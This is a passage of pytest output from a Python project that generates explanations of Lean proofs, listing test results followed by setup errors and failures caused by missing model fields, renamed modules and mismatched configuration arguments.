tests/unit/test_parsers.py::TestHybridLeanParser::test_enhanced_parser_initialization SKIPPED [ 91%]
tests/unit/test_parsers.py::TestHybridLeanParser::test_complexity_analysis SKIPPED [ 92%]
tests/unit/test_parsers.py::TestHybridLeanParser::test_notation_enhancement SKIPPED [ 92%]
tests/unit/test_parsers.py::TestHybridLeanParser::test_proof_structure_analysis SKIPPED [ 92%]
tests/unit/test_parsers.py::TestHybridLeanParser::test_semantic_analysis SKIPPED [ 93%]
tests/unit/test_parsers.py::TestLeanExtractor::test_extractor_initialization FAILED [ 93%]
tests/unit/test_parsers.py::TestLeanExtractor::test_extract_file_basic FAILED [ 93%]
tests/unit/test_parsers.py::TestLeanExtractor::test_lean_command_execution FAILED [ 94%]
tests/unit/test_parsers.py::TestLeanExtractor::test_theorem_validation FAILED [ 94%]
tests/unit/test_parsers.py::TestLeanExtractor::test_error_handling FAILED [ 94%]
tests/unit/test_parsers.py::TestParserConfig::test_config_creation FAILED [ 95%]
tests/unit/test_parsers.py::TestParserConfig::test_config_validation FAILED [ 95%]
tests/unit/test_parsers.py::TestParserConfig::test_config_serialization FAILED [ 95%]
tests/unit/test_parsers.py::TestParserConfig::test_config_loading FAILED [ 96%]
tests/unit/test_progressive_generator.py::test_progressive_explanation_generation PASSED [ 96%]
tests/unit/test_progressive_generator.py::test_learning_pathway_creation PASSED [ 96%]
tests/unit/test_progressive_generator.py::test_concept_extraction PASSED [ 97%]
tests/unit/test_progressive_generator.py::test_educational_adaptation PASSED [ 97%]
tests/unit/test_progressive_generator.py::test_interactive_elements PASSED [ 97%]
tests/unit/test_progressive_generator.py::test_comprehensive_integration PASSED [ 98%]
tests/unit/test_semantic_generator.py::test_semantic_generator_levels PASSED [ 98%]
tests/unit/test_semantic_generator.py::test_progressive_explanations PASSED [ 98%]
tests/unit/test_semantic_generator.py::test_mathematical_entity_recognition PASSED [ 99%]
tests/unit/test_semantic_generator.py::test_tactic_aware_explanations PASSED [ 99%]
tests/unit/test_semantic_generator.py::test_backward_compatibility PASSED [100%]

==================================== ERRORS ====================================
____ ERROR at setup of TestFullPipeline.test_parse_generate_export_pipeline ____
tests/integration/test_full_pipeline.py:61: in mock_proof_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 9 validation errors for ProofSketch
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
_______ ERROR at setup of TestFullPipeline.test_async_animation_pipeline _______
tests/integration/test_full_pipeline.py:61: in mock_proof_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 9 validation errors for ProofSketch
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'nat_add...ural number arithmetic'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
____ ERROR at setup of TestMarkdownExporter.test_mathlib_sketch_enhancement ____
tests/integration/test_mathlib_real.py:204: in sample_mathlib_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   theorem_statement
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
____ ERROR at setup of TestMarkdownExporter.test_notation_table_generation _____
tests/integration/test_mathlib_real.py:204: in sample_mathlib_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   theorem_statement
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
______ ERROR at setup of TestMarkdownExporter.test_complexity_assessment _______
tests/integration/test_mathlib_real.py:204: in sample_mathlib_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   theorem_statement
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
__________ ERROR at setup of TestMarkdownExporter.test_mathlib_export __________
tests/integration/test_mathlib_real.py:204: in sample_mathlib_sketch
    return ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   theorem_statement
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'Nat.add..._succ', 'Nat.succ_add']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
_ ERROR at setup of TestParserGeneratorIntegration.test_parse_and_generate_simple _
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
_ ERROR at setup of TestParserGeneratorIntegration.test_parse_and_generate_induction _
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
_ ERROR at setup of TestParserGeneratorIntegration.test_parse_and_generate_multiple _
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
_ ERROR at setup of TestParserGeneratorIntegration.test_mathematical_context_generation _
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
_____ ERROR at setup of TestParserGeneratorIntegration.test_error_recovery _____
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
__ ERROR at setup of TestParserGeneratorIntegration.test_caching_integration ___
tests/integration/test_parser_generator.py:23: in parser_config
    return ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'auto_detect_lake'
______________ ERROR at setup of test_educational_content_quality ______________
file /Users/brightliu/Coding_Projects/proof-sketcher/tests/unit/test_mathlib_integration.py, line 153
  def test_educational_content_quality(parse_results):
E       fixture 'parse_results' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, benchmark, benchmark_weave, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, capteesys, captured_logs, class_mocker, clean_environment, cli_runner, complex_lean_file, cov, doctest_namespace, empty_lean_file, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, malformed_lean_file, mocker, module_mocker, monkeypatch, no_cover, output_dir, package_mocker, performance_timer, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_files, sample_lean_file, sample_proof_sketch, sample_theorem, session_mocker, temp_dir, test_data_factory, testrun_uid, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/Users/brightliu/Coding_Projects/proof-sketcher/tests/unit/test_mathlib_integration.py:153
______________ ERROR at setup of test_export_pipeline_integration ______________
file /Users/brightliu/Coding_Projects/proof-sketcher/tests/unit/test_mathlib_integration.py, line 265
  def test_export_pipeline_integration(parse_results):
E       fixture 'parse_results' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, benchmark, benchmark_weave, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, capteesys, captured_logs, class_mocker, clean_environment, cli_runner, complex_lean_file, cov, doctest_namespace, empty_lean_file, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, malformed_lean_file, mocker, module_mocker, monkeypatch, no_cover, output_dir, package_mocker, performance_timer, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_files, sample_lean_file, sample_proof_sketch, sample_theorem, session_mocker, temp_dir, test_data_factory, testrun_uid, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/Users/brightliu/Coding_Projects/proof-sketcher/tests/unit/test_mathlib_integration.py:265
=================================== FAILURES ===================================
_________ TestSimpleTheoremPipeline.test_simple_theorem_full_pipeline __________
tests/integration/test_end_to_end.py:56: in test_simple_theorem_full_pipeline
    assert parse_result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
_____________ TestSimpleTheoremPipeline.test_offline_mode_pipeline _____________
tests/integration/test_end_to_end.py:123: in test_offline_mode_pipeline
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
___________ TestMathlibTheoremPipeline.test_mathlib_theorem_pipeline ___________
tests/integration/test_end_to_end.py:153: in test_mathlib_theorem_pipeline
    with patch(
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1451: in __enter__
    self.target = self.getter()
                  ^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/pkgutil.py:528: in resolve_name
    result = getattr(result, p)
             ^^^^^^^^^^^^^^^^^^
E   AttributeError: module 'proof_sketcher.generator' has no attribute 'claude'
__________________ TestBatchProcessing.test_batch_processing ___________________
tests/integration/test_end_to_end.py:223: in test_batch_processing
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
____________________ TestErrorRecovery.test_error_recovery _____________________
tests/integration/test_end_to_end.py:274: in test_error_recovery
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
___________________ TestErrorRecovery.test_timeout_handling ____________________
tests/integration/test_end_to_end.py:286: in test_timeout_handling
    from proof_sketcher.generator.claude import ClaudeClient
E   ModuleNotFoundError: No module named 'proof_sketcher.generator.claude'
_________________ TestErrorRecovery.test_memory_limit_handling _________________
tests/integration/test_end_to_end.py:311: in test_memory_limit_handling
    from proof_sketcher.core.resources import ResourceManager
E   ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
__________ TestPerformanceBenchmarks.test_single_theorem_performance ___________
tests/integration/test_end_to_end.py:351: in test_single_theorem_performance
    benchmark(process_theorem)
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:156: in __call__
    return self._raw(function_to_benchmark, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:180: in _raw
    duration, iterations, loops_range = self._calibrate_timer(runner)
                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:318: in _calibrate_timer
    duration = runner(loops_range)
               ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:109: in runner
    function_to_benchmark(*args, **kwargs)
tests/integration/test_end_to_end.py:348: in process_theorem
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
_______________ TestPerformanceBenchmarks.test_batch_performance _______________
tests/integration/test_end_to_end.py:383: in test_batch_performance
    stats = benchmark(process_batch)
            ^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:156: in __call__
    return self._raw(function_to_benchmark, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:180: in _raw
    duration, iterations, loops_range = self._calibrate_timer(runner)
                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:318: in _calibrate_timer
    duration = runner(loops_range)
               ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/site-packages/pytest_benchmark/fixture.py:109: in runner
    function_to_benchmark(*args, **kwargs)
tests/integration/test_end_to_end.py:380: in process_batch
    assert result.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
______________ TestPerformanceBenchmarks.test_cache_effectiveness ______________
tests/integration/test_end_to_end.py:409: in test_cache_effectiveness
    assert result1.exit_code == 0
E   assert 2 == 0
E    +  where 2 = <Result SystemExit(2)>.exit_code
_______________ TestFullPipeline.test_batch_processing_pipeline ________________
tests/integration/test_full_pipeline.py:219: in test_batch_processing_pipeline
    with patch(
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1451: in __enter__
    self.target = self.getter()
                  ^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/pkgutil.py:528: in resolve_name
    result = getattr(result, p)
             ^^^^^^^^^^^^^^^^^^
E   AttributeError: module 'proof_sketcher' has no attribute 'batch'
________________ TestFullPipeline.test_error_handling_pipeline _________________
tests/integration/test_full_pipeline.py:252: in test_error_handling_pipeline
    with patch(
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1451: in __enter__
    self.target = self.getter()
                  ^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/pkgutil.py:528: in resolve_name
    result = getattr(result, p)
             ^^^^^^^^^^^^^^^^^^
E   AttributeError: module 'proof_sketcher.parser' has no attribute 'lean_parser'. Did you mean: 'LeanParser'?
_________________ TestFullPipeline.test_configuration_pipeline _________________
tests/integration/test_full_pipeline.py:272: in test_configuration_pipeline
    generation=GenerationConfig(
E   pydantic_core._pydantic_core.ValidationError: 1 validation error for GenerationConfig
E   model
E     Input should be 'claude-3-5-sonnet-20241022', 'claude-3-5-haiku-20241022' or 'claude-3-opus-20240229' [type=enum, input_value='claude-3', input_type=str]
E       For further information visit https://errors.pydantic.dev/2.11/v/enum
__________________ TestCLIIntegration.test_cli_prove_command ___________________
tests/integration/test_full_pipeline.py:303: in test_cli_prove_command
    with patch(
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1451: in __enter__
    self.target = self.getter()
                  ^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/pkgutil.py:528: in resolve_name
    result = getattr(result, p)
             ^^^^^^^^^^^^^^^^^^
E   AttributeError: module 'proof_sketcher.parser' has no attribute 'lean_parser'. Did you mean: 'LeanParser'?
__________________ TestCLIIntegration.test_cli_batch_command ___________________
tests/integration/test_full_pipeline.py:351: in test_cli_batch_command
    with patch(
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1451: in __enter__
    self.target = self.getter()
                  ^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/pkgutil.py:528: in resolve_name
    result = getattr(result, p)
             ^^^^^^^^^^^^^^^^^^
E   AttributeError: module 'proof_sketcher' has no attribute 'batch'
____________ TestCacheIntegration.test_generation_cache_integration ____________
tests/integration/test_full_pipeline.py:386: in test_generation_cache_integration
    from proof_sketcher.generator.cache import GenerationCache
E   ModuleNotFoundError: No module named 'proof_sketcher.generator.cache'
______________ TestCacheIntegration.test_export_cache_integration ______________
tests/integration/test_full_pipeline.py:412: in test_export_cache_integration
    from proof_sketcher.exporter.models import BaseExporterBase
E   ImportError: cannot import name 'BaseExporterBase' from 'proof_sketcher.exporter.models' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/exporter/models.py)
______________ TestResourceManagement.test_memory_limits_pipeline ______________
tests/integration/test_full_pipeline.py:450: in test_memory_limits_pipeline
    from proof_sketcher.core.resources import ExportOptions, ResourceMonitor
E   ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
________________ TestResourceManagement.test_temp_file_cleanup _________________
tests/integration/test_full_pipeline.py:468: in test_temp_file_cleanup
    from proof_sketcher.core.resources import TempFileManager
E   ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
_______ TestPerformanceIntegration.test_parallel_processing_performance ________
tests/integration/test_full_pipeline.py:495: in test_parallel_processing_performance
    from proof_sketcher.exporter.batch_processor.parallel_processor import (
E   ModuleNotFoundError: No module named 'proof_sketcher.exporter.batch_processor.parallel_processor'; 'proof_sketcher.exporter.batch_processor' is not a package
______ TestPerformanceIntegration.test_notation_optimization_performance _______
tests/integration/test_full_pipeline.py:532: in test_notation_optimization_performance
    from proof_sketcher.parser.models_optimized import OptimizedParserConfig
E   ModuleNotFoundError: No module named 'proof_sketcher.parser.models_optimized'
____________ TestMathlibIntegration.test_mathlib_notation_handling _____________
tests/integration/test_full_pipeline.py:563: in test_mathlib_notation_handling
    from proof_sketcher.parser.models import ParserConfig
E   ImportError: cannot import name 'ParserConfig' from 'proof_sketcher.parser.models' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/parser/models.py)
_______________ TestParserConfig.test_basic_notation_conversion ________________
tests/integration/test_mathlib_real.py:150: in test_basic_notation_conversion
    assert handler.convert_to_latex("∀ x ∈ ℕ") == r"\forall x \in \mathbb{N}"
           ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
____________________ TestParserConfig.test_complex_notation ____________________
tests/integration/test_mathlib_real.py:159: in test_complex_notation
    result = handler.convert_to_latex("f : ℕ → ℝ")
             ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
_______________ TestParserConfig.test_notation_table_generation ________________
tests/integration/test_mathlib_real.py:171: in test_notation_table_generation
    table = handler.get_notation_table(text)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ParserConfig' object has no attribute 'get_notation_table'
______________ TestParserConfig.test_mathematical_area_detection _______________
tests/integration/test_mathlib_real.py:187: in test_mathematical_area_detection
    areas = handler.detect_mathematical_areas(set_text)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ParserConfig' object has no attribute 'detect_mathematical_areas'
__________ TestMathlibIntegration.test_mathlib_style_project_scanning __________
tests/integration/test_mathlib_real.py:313: in test_mathlib_style_project_scanning
    result = scanner.scan_project(tmp_path)
             ^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'BatchExporter' object has no attribute 'scan_project'
__________ TestMathlibIntegration.test_end_to_end_mathlib_processing ___________
tests/integration/test_mathlib_real.py:390: in test_end_to_end_mathlib_processing
    assert len(processed_theorems) > 0
E   assert 0 > 0
E    +  where 0 = len([])
----------------------------- Captured stdout call -----------------------------
Processing failed for basic: 'ParseResult' object is not subscriptable
Processing failed for set: 'ParseResult' object is not subscriptable
Processing failed for topology: 'ParseResult' object is not subscriptable
_____________ TestMathlibIntegration.test_mathlib_batch_processing _____________
tests/integration/test_mathlib_real.py:416: in test_mathlib_batch_processing
    from proof_sketcher.exporter.batch_processor import (
E   ImportError: cannot import name 'ParallelProcessor' from 'proof_sketcher.exporter.batch_processor' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/exporter/batch_processor.py)
___________ TestMathlibPerformance.test_notation_handler_performance ___________
tests/integration/test_mathlib_real.py:476: in test_notation_handler_performance
    result = handler.convert_to_latex(large_text)
             ^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
_______________ TestMathlibPerformance.test_exporter_performance _______________
tests/integration/test_mathlib_real.py:488: in test_exporter_performance
    complex_sketch = ProofSketch(
E   pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
E   theorem_statement
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_overview
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_overview
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_overview
